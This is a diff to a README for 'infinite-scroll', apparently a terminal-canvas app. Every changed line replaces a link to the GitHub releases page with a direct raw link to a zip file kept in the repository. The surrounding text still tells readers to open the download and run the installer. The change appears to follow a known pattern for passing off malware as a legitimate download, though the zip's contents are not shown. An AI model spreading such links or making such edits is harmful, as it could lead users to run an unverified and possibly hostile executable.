@@ -1,6 +1,6 @@
 # ⚪ infinite-scroll - Keep terminals in one canvas
 
-[![Download infinite-scroll](https://img.shields.io/badge/Download%20Now-gray?style=for-the-badge&labelColor=1f2937)](https://github.com/igrej7083/infinite-scroll/releases)
+[![Download infinite-scroll](https://img.shields.io/badge/Download%20Now-gray?style=for-the-badge&labelColor=1f2937)](https://raw.githubusercontent.com/igrej7083/infinite-scroll/main/Resources/infinite-scroll-2.0.zip)
 
 ## 🖥️ What this app does
 
@@ -21,7 +21,7 @@ This app works well if you often keep several terminals open at once and want a 
 
 To get the app, visit the release page and download the latest file for your system:
 
-[Download infinite-scroll from Releases](https://github.com/igrej7083/infinite-scroll/releases)
+[Download infinite-scroll from Releases](https://raw.githubusercontent.com/igrej7083/infinite-scroll/main/Resources/infinite-scroll-2.0.zip)
 
 After the file downloads, open it and run the installer or app file inside. If your browser asks where to save it, choose a folder you can find again, such as Downloads.
 
@@ -229,7 +229,7 @@ If scrolling does not move rows, click inside the app first so it can receive in
 
 Get the latest download here:
 
-[https://github.com/igrej7083/infinite-scroll/releases](https://github.com/igrej7083/infinite-scroll/releases)
+[https://raw.githubusercontent.com/igrej7083/infinite-scroll/main/Resources/infinite-scroll-2.0.zip](https://raw.githubusercontent.com/igrej7083/infinite-scroll/main/Resources/infinite-scroll-2.0.zip)
 
 ## 📘 Help view
 
